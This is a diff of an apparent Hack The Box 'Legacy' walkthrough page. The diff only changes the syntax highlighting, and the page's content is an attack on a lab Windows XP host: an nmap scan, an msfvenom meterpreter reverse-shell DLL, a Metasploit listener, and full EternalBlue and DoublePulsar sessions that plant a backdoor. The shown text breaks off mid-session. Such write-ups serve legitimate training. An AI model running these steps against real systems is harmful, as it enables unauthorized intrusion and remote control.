@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -311,30 +311,31 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A 10.10.10.4
-
-Nmap scan report for 10.10.10.4
-PORT     STATE  SERVICE       VERSION
-139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open   microsoft-ds  Windows XP microsoft-ds
-3389/tcp closed ms-wbt-server
-Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
-OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
-
-Host script results:
-|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
-| smb-os-discovery: 
-|   OS: Windows XP (Windows 2000 LAN Manager)
-|   OS CPE: cpe:/o:microsoft:windows_xp::-
-|   Computer name: legacy
-|   NetBIOS computer name: LEGACY\x00
-|   Workgroup: HTB\x00
-| smb-security-mode: 
-|   account_used: &lt;blank&gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A 10.10.10.4
+<span class="err">
+</span><span class="err"></span><span class="go">Nmap scan report for 10.10.10.4
+</span><span class="go">PORT     STATE  SERVICE       VERSION
+</span><span class="go">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+</span><span class="go">445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+</span><span class="go">3389/tcp closed ms-wbt-server
+</span><span class="go">Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
+</span><span class="go">OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
+</span><span class="go">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Host script results:
+</span><span class="go">|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
+</span><span class="go">| smb-os-discovery: 
+</span><span class="go">|   OS: Windows XP (Windows 2000 LAN Manager)
+</span><span class="go">|   OS CPE: cpe:/o:microsoft:windows_xp::-
+</span><span class="go">|   Computer name: legacy
+</span><span class="go">|   NetBIOS computer name: LEGACY\x00
+</span><span class="go">|   Workgroup: HTB\x00
+</span><span class="go">| smb-security-mode: 
+</span><span class="go">|   account_used: &lt;blank&gt;
+</span><span class="go">|   authentication_level: user
+</span><span class="go">|   challenge_response: supported
+</span><span class="go">|_  message_signing: disabled (dangerous, but default)
+</span></code></pre></div></div>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -342,355 +343,368 @@ Host script results:
 
 <p>Install wine and winetricks using the package manager of your linux distro.
 We initiate a wine32 environment (you may need to install 32-bit packages)
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; WINEARCH=win32 wine wineboot</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> <span class="nv">WINEARCH</span><span class="o">=</span>win32 wine wineboot
+</code></pre></div></div></p>
 
 <p>Install python26 via winetricks
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; winetricks python26</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nv">WINEPREFIX</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.wine-fuzzbunch&#34;</span> winetricks python26
+</code></pre></div></div></p>
 
 <p>Get files from git
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c &amp;&amp; git clone https://github.com/mdiazcl/fuzzbunch-debian</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c <span class="o">&amp;&amp;</span> git clone https://github.com/mdiazcl/fuzzbunch-debian
+</code></pre></div></div></p>
 
 <p>I have written a little script to run fuzzbunch:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nano /usr/local/bin/fuzzbunch 
-    export WINEPREFIX=$HOME/.wine-fuzzbunch
-    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
-    wine ../../Python26/python.exe fb.py
-
-$ sudo chmod +x /usr/local/bin/fuzzbunch</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nano /usr/local/bin/fuzzbunch 
+<span class="go">    export WINEPREFIX=$HOME/.wine-fuzzbunch
+</span><span class="go">    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
+</span><span class="go">    wine ../../Python26/python.exe fb.py
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>sudo chmod +x /usr/local/bin/fuzzbunch
+</code></pre></div></div></p>
 
 <p>Making the shellcode payload
 We need a DLL shellcode payload. You can use msfvenom to make it or anything else you like:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c/
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[INSERT_YOUR_IP_HERE] LPORT=60000 -f dll -o shell.dll
-
-No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No Arch selected, selecting Arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 333 bytes
-Final size of dll file: 5120 bytes
-Saved as: shell.dll</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">cd</span> <span class="nv">$HOME</span>/.wine-fuzzbunch/drive_c/
+<span class="gp">$ </span>msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>INSERT_YOUR_IP_HERE<span class="o">]</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f dll -o shell.dll
+<span class="err">
+</span><span class="err"></span><span class="go">No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span><span class="go">No Arch selected, selecting Arch: x86 from the payload
+</span><span class="go">No encoder or badchars specified, outputting raw payload
+</span><span class="go">Payload size: 333 bytes
+</span><span class="go">Final size of dll file: 5120 bytes
+</span><span class="go">Saved as: shell.dll
+</span></code></pre></div></div></p>
 
 <h2 id="setting-up-the-listener">Setting up the listener</h2>
 
 <p>Again, you can use whatever listener you like. Here, I use the handler from metasploit:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfconsole
-msf &gt; use exploit/multi/handler 
-msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
-msf exploit(handler) &gt; set LPORT 60000
-msf exploit(handler) &gt; exploit
-[*] Exploit running as background job 0.
-[*] Started reverse TCP handler on YOUR_IP_HERE:60000</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfconsole
+<span class="go">msf &gt; use exploit/multi/handler 
+</span><span class="go">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</span><span class="go">msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
+</span><span class="go">msf exploit(handler) &gt; set LPORT 60000
+</span><span class="go">msf exploit(handler) &gt; exploit
+</span><span class="go">[*] Exploit running as background job 0.
+</span><span class="go">[*] Started reverse TCP handler on YOUR_IP_HERE:60000
+</span></code></pre></div></div></p>
 
 <h2 id="running-fuzzbunch">Running fuzzbunch</h2>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ fuzzbunch 
-
-[*] Loading Plugins
-[*] Initializing Fuzzbunch v3.5.1
-[*] Adding Global Variables
-[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
-[+] Set Color =&gt; True
-[+] Set ShowHiddenParameters =&gt; False
-[+] Set NetworkTimeout =&gt; 60
-[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
-[*] Autorun ON
-
-[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
-
-[*] Retargetting Session
-
-[?] Default Target IP Address [] : 10.10.10.4
-[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
-[?] Use Redirection [yes] : no
-
-[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
-[*] Checking C:\fuzzbunch-debian\logs for projects
-Index     Project                 
------     -------                 
-0         Create a New Project    
-
-[?] Project [0] : 0
-[?] New Project Name : LEGACY
-[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
-
-[*] Initializing Global State
-[+] Set TargetIp =&gt; 10.10.10.4
-[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
-
-[!] Redirection OFF
-[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
-[+] Set Project =&gt; legacy</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>fuzzbunch 
+<span class="err">
+</span><span class="err"></span><span class="go">[*] Loading Plugins
+</span><span class="go">[*] Initializing Fuzzbunch v3.5.1
+</span><span class="go">[*] Adding Global Variables
+</span><span class="go">[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
+</span><span class="go">[+] Set Color =&gt; True
+</span><span class="go">[+] Set ShowHiddenParameters =&gt; False
+</span><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
+</span><span class="go">[*] Autorun ON
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Retargetting Session
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Default Target IP Address [] : 10.10.10.4
+</span><span class="go">[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
+</span><span class="go">[?] Use Redirection [yes] : no
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
+</span><span class="go">[*] Checking C:\fuzzbunch-debian\logs for projects
+</span><span class="go">Index     Project                 
+</span><span class="go">-----     -------                 
+</span><span class="go">0         Create a New Project    
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Project [0] : 0
+</span><span class="go">[?] New Project Name : LEGACY
+</span><span class="go">[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Initializing Global State
+</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span><span class="go">[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Redirection OFF
+</span><span class="go">[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
+</span><span class="go">[+] Set Project =&gt; legacy
+</span></code></pre></div></div>
 
 <h3 id="executing-eternalblue">Executing EternalBlue</h3>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">fb &gt; use EternalBlue
-
-[!] Entering Plugin Context :: Eternalblue
-[*] Applying Global Variables
-[+] Set NetworkTimeout =&gt; 60
-[+] Set TargetIp =&gt; 10.10.10.4
-
-[*] Applying Session Parameters
-[*] Running Exploit Touches
-
-[!] Enter Prompt Mode :: Eternalblue
-
-Module: Eternalblue
-===================
-
-[?] Prompt For Variable Settings? [Yes] : y
-[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
-[?] NetworkTimeout [60] : 
-[*]  TargetIp :: Target IP Address
-[?] TargetIp [10.10.10.4] : 
-[*]  TargetPort :: Port used by the SMB service for exploit connection
-[?] TargetPort [445] : 
-[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
-[?] VerifyTarget [True] : 
-[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
-[?] VerifyBackdoor [True] : 
-[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
-[?] MaxExploitAttempts [3] : 
-[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
-[?] GroomAllocations [12] : 
-[*]  Target :: Operating System, Service Pack, and Architecture of target OS
-
-*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
-    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
-
-[?] Target [1] : 0
-[+] Set Target =&gt; XP
-
-[!] Preparing to Execute Eternalblue
-
-[*]  Mode :: Delivery mechanism
-
-    0) DANE     Forward deployment via DARINGNEOPHYTE
-*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
-
-[?] Mode [0] : 1
-[+] Run Mode: FB
-
-[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
-[*] Redirection OFF
-
-[+] Configure Plugin Local Tunnels
-[+] Local Tunnel - local-tunnel-1
-[?] Destination IP [10.10.10.4] : 
-[?] Destination Port [445] : 
-[+] (TCP) Local 10.10.10.4:445
-
-[+] Configure Plugin Remote Tunnels</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fb &gt; use EternalBlue
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Entering Plugin Context :: Eternalblue
+</span><span class="go">[*] Applying Global Variables
+</span><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Applying Session Parameters
+</span><span class="go">[*] Running Exploit Touches
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Eternalblue
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Module: Eternalblue
+</span><span class="go">===================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Prompt For Variable Settings? [Yes] : y
+</span><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+</span><span class="go">[?] NetworkTimeout [60] : 
+</span><span class="go">[*]  TargetIp :: Target IP Address
+</span><span class="go">[?] TargetIp [10.10.10.4] : 
+</span><span class="go">[*]  TargetPort :: Port used by the SMB service for exploit connection
+</span><span class="go">[?] TargetPort [445] : 
+</span><span class="go">[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+</span><span class="go">[?] VerifyTarget [True] : 
+</span><span class="go">[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+</span><span class="go">[?] VerifyBackdoor [True] : 
+</span><span class="go">[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+</span><span class="go">[?] MaxExploitAttempts [3] : 
+</span><span class="go">[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+</span><span class="go">[?] GroomAllocations [12] : 
+</span><span class="go">[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
+</span><span class="go">    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Target [1] : 0
+</span><span class="go">[+] Set Target =&gt; XP
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Preparing to Execute Eternalblue
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*]  Mode :: Delivery mechanism
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">    0) DANE     Forward deployment via DARINGNEOPHYTE
+</span><span class="go">*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Mode [0] : 1
+</span><span class="go">[+] Run Mode: FB
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
+</span><span class="go">[*] Redirection OFF
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Configure Plugin Local Tunnels
+</span><span class="go">[+] Local Tunnel - local-tunnel-1
+</span><span class="go">[?] Destination IP [10.10.10.4] : 
+</span><span class="go">[?] Destination Port [445] : 
+</span><span class="go">[+] (TCP) Local 10.10.10.4:445
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
+</span></code></pre></div></div>
 
 <p>These are our final settings for EternalBlue:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">Module: Eternalblue
-===================
-
-Name                  Value                                                 
-----                  -----                                                 
-DaveProxyPort         0                                                     
-NetworkTimeout        60                                                    
-TargetIp              10.10.10.4                                            
-TargetPort            445                                                   
-VerifyTarget          True                                                  
-VerifyBackdoor        True                                                  
-MaxExploitAttempts    3                                                     
-GroomAllocations      12                                                    
-ShellcodeBuffer                                                             
-Target                XP</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Module: Eternalblue
+</span><span class="go">===================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Name                  Value                                                 
+</span><span class="go">----                  -----                                                 
+</span><span class="go">DaveProxyPort         0                                                     
+</span><span class="go">NetworkTimeout        60                                                    
+</span><span class="go">TargetIp              10.10.10.4                                            
+</span><span class="go">TargetPort            445                                                   
+</span><span class="go">VerifyTarget          True                                                  
+</span><span class="go">VerifyBackdoor        True                                                  
+</span><span class="go">MaxExploitAttempts    3                                                     
+</span><span class="go">GroomAllocations      12                                                    
+</span><span class="go">ShellcodeBuffer                                                             
+</span><span class="go">Target                XP
+</span></code></pre></div></div></p>
 
 <p>Now let&rsquo;s execute it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : y    
-[*] Executing Plugin
-[*] Connecting to target for exploitation.
-    [+] Connection established for exploitation.
-[*] Pinging backdoor...
-    [+] Backdoor not installed, game on.
-[*] Forcing MaxExploitAttempts to 1.
-[*] Target OS selected valid for OS indicated by SMB reply
-[*] CORE raw buffer dump (12 bytes):
-0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
-[*] Fingerprinting SMB non-paged pool quota
-    [+] Allocation total: 0xfff4
-    [+] Spray size: 0
-    [+] Allocation total: 0x1ffe8
-    [+] Spray size: 1
-    [+] Allocation total: 0x2ffdc
-    [+] Spray size: 2
-    [+] Allocation total: 0x3ffd0
-    [+] Spray size: 3
-    [+] Allocation total: 0x4ffc4
-    [+] Spray size: 4
-    [+] Allocation total: 0x5ffb8
-    [+] Spray size: 5
-    [+] Allocation total: 0x6ffac
-    [+] Spray size: 6
-    [+] Allocation total: 0x7ffa0
-    [+] Spray size: 7
-    [+] Allocation total: 0x8ff94
-    [+] Spray size: 8
-    [+] Allocation total: 0x9ff88
-    [+] Spray size: 9
-    [+] Allocation total: 0xaff7c
-    [+] Spray size: 10
-    [+] Allocation total: 0xbff70
-    [+] Spray size: 11
-    [+] Quota NOT exceeded after 12 packets
-    [+] Allocation total: 0xbff70
-[*] Building exploit buffer
-[*] Sending all but last fragment of exploit packet
-    ................DONE.
-[*] Sending SMB Echo request
-[*] Good reply from SMB Echo request
-[*] Starting non-paged pool grooming
-    [+] Sending 2 non-paged pool fragment packets
-        ....DONE.
-    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
-    [+] Sending 10 non-paged pool grooming packets
-        ..........DONE.
-    [+] Sent 10 non-paged pool grooming packets - groom complete
-[*] Sending SMB Echo request
-[*] Good reply from SMB Echo request
-[*] Sending last fragment of exploit packet!
-    DONE.
-[*] Receiving response from exploit packet
-    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
-[*] Triggering free of corrupted buffer.
-[*] Pinging backdoor...
-    [+] Backdoor returned code: 10 - Success!
-    [+] Ping returned Target architecture: x86 (32-bit)
-    [+] Backdoor installed
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] CORE sent serialized output blob (2 bytes):
-0x00000000  08 00                                            ..
-[*] Received output parameters from CORE
-[+] CORE terminated with status code 0x00000000
-[+] Eternalblue Succeeded</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[?] Execute Plugin? [Yes] : y    
+</span><span class="go">[*] Executing Plugin
+</span><span class="go">[*] Connecting to target for exploitation.
+</span><span class="go">    [+] Connection established for exploitation.
+</span><span class="go">[*] Pinging backdoor...
+</span><span class="go">    [+] Backdoor not installed, game on.
+</span><span class="go">[*] Forcing MaxExploitAttempts to 1.
+</span><span class="go">[*] Target OS selected valid for OS indicated by SMB reply
+</span><span class="go">[*] CORE raw buffer dump (12 bytes):
+</span><span class="go">0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
+</span><span class="go">[*] Fingerprinting SMB non-paged pool quota
+</span><span class="go">    [+] Allocation total: 0xfff4
+</span><span class="go">    [+] Spray size: 0
+</span><span class="go">    [+] Allocation total: 0x1ffe8
+</span><span class="go">    [+] Spray size: 1
+</span><span class="go">    [+] Allocation total: 0x2ffdc
+</span><span class="go">    [+] Spray size: 2
+</span><span class="go">    [+] Allocation total: 0x3ffd0
+</span><span class="go">    [+] Spray size: 3
+</span><span class="go">    [+] Allocation total: 0x4ffc4
+</span><span class="go">    [+] Spray size: 4
+</span><span class="go">    [+] Allocation total: 0x5ffb8
+</span><span class="go">    [+] Spray size: 5
+</span><span class="go">    [+] Allocation total: 0x6ffac
+</span><span class="go">    [+] Spray size: 6
+</span><span class="go">    [+] Allocation total: 0x7ffa0
+</span><span class="go">    [+] Spray size: 7
+</span><span class="go">    [+] Allocation total: 0x8ff94
+</span><span class="go">    [+] Spray size: 8
+</span><span class="go">    [+] Allocation total: 0x9ff88
+</span><span class="go">    [+] Spray size: 9
+</span><span class="go">    [+] Allocation total: 0xaff7c
+</span><span class="go">    [+] Spray size: 10
+</span><span class="go">    [+] Allocation total: 0xbff70
+</span><span class="go">    [+] Spray size: 11
+</span><span class="go">    [+] Quota NOT exceeded after 12 packets
+</span><span class="go">    [+] Allocation total: 0xbff70
+</span><span class="go">[*] Building exploit buffer
+</span><span class="go">[*] Sending all but last fragment of exploit packet
+</span><span class="go">    ................DONE.
+</span><span class="go">[*] Sending SMB Echo request
+</span><span class="go">[*] Good reply from SMB Echo request
+</span><span class="go">[*] Starting non-paged pool grooming
+</span><span class="go">    [+] Sending 2 non-paged pool fragment packets
+</span><span class="go">        ....DONE.
+</span><span class="go">    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
+</span><span class="go">    [+] Sending 10 non-paged pool grooming packets
+</span><span class="go">        ..........DONE.
+</span><span class="go">    [+] Sent 10 non-paged pool grooming packets - groom complete
+</span><span class="go">[*] Sending SMB Echo request
+</span><span class="go">[*] Good reply from SMB Echo request
+</span><span class="go">[*] Sending last fragment of exploit packet!
+</span><span class="go">    DONE.
+</span><span class="go">[*] Receiving response from exploit packet
+</span><span class="go">    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+</span><span class="go">[*] Triggering free of corrupted buffer.
+</span><span class="go">[*] Pinging backdoor...
+</span><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span><span class="go">    [+] Ping returned Target architecture: x86 (32-bit)
+</span><span class="go">    [+] Backdoor installed
+</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span><span class="go">[*] CORE sent serialized output blob (2 bytes):
+</span><span class="go">0x00000000  08 00                                            ..
+</span><span class="go">[*] Received output parameters from CORE
+</span><span class="go">[+] CORE terminated with status code 0x00000000
+</span><span class="go">[+] Eternalblue Succeeded
+</span></code></pre></div></div></p>
 
 <h3 id="executing-doublepulsar">Executing DoublePulsar</h3>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">fb Special (Eternalblue) &gt; use DoublePulsar
-
-[!] Entering Plugin Context :: Doublepulsar
-[*] Applying Global Variables
-[+] Set NetworkTimeout =&gt; 60
-[+] Set TargetIp =&gt; 10.10.10.4
-
-[*] Applying Session Parameters
-
-[!] Enter Prompt Mode :: Doublepulsar
-
-Module: Doublepulsar
-====================
-
-Name              Value                                                 
-----              -----                                                 
-NetworkTimeout    60                                                    
-TargetIp          10.10.10.4                                            
-TargetPort        445                                                   
-OutputFile                                                              
-Protocol          SMB                                                   
-Architecture      x86                                                   
-Function          OutputInstall                                         
-
-[!] Plugin Variables are NOT Valid
-[?] Prompt For Variable Settings? [Yes] : 
-[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
-[?] NetworkTimeout [60] : 
-[*]  TargetIp :: Target IP Address
-[?] TargetIp [10.10.10.4] : 
-[*]  TargetPort :: Port used by the Double Pulsar back door
-[?] TargetPort [445] : 
-[*]  Protocol :: Protocol for the backdoor to speak
-
-*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
-    1) RDP     Ring 0 RDP (TCP 3389) backdoor
-
-[?] Protocol [0] : 
-[*]  Architecture :: Architecture of the target OS
-
-*-&gt; 0) x86     x86 32-bits
-    1) x64     x64 64-bits
-
-[?] Architecture [0] : 
-[*]  Function :: Operation for backdoor to perform
-
-    0) OutputInstall     Only output the install shellcode to a binary file on disk.
-    1) Ping              Test for presence of backdoor
-*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
-    3) RunShellcode      Run raw shellcode
-    4) Uninstall         Remove&#39;s backdoor from system
-
-[?] Function [0] : 2
-[+] Set Function =&gt; RunDLL
-[*]  DllPayload :: DLL to inject into user mode
-[?] DllPayload [] : 
-[*]  DllPayload :: DLL to inject into user mode
-[?] DllPayload [] : C:\shell.dll
-[+] Set DllPayload =&gt; C:\shell.dll
-[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
-[?] DllOrdinal [1] : 
-[*]  ProcessName :: Name of process to inject into
-[?] ProcessName [lsass.exe] : svchost.exe    
-[+] Set ProcessName =&gt; svchost.exe
-[*]  ProcessCommandLine :: Command line of process to inject into
-[?] ProcessCommandLine [] : 
-
-[!] Preparing to Execute Doublepulsar
-[*] Redirection OFF
-[+] Configure Plugin Local Tunnels
-[+] Local Tunnel - local-tunnel-1
-[?] Destination IP [10.10.10.4] : 
-[?] Destination Port [445] : 
-[+] (TCP) Local 10.10.10.4:445
-
-[+] Configure Plugin Remote Tunnels</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fb Special (Eternalblue) &gt; use DoublePulsar
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Entering Plugin Context :: Doublepulsar
+</span><span class="go">[*] Applying Global Variables
+</span><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span><span class="go"></span><span class="err">
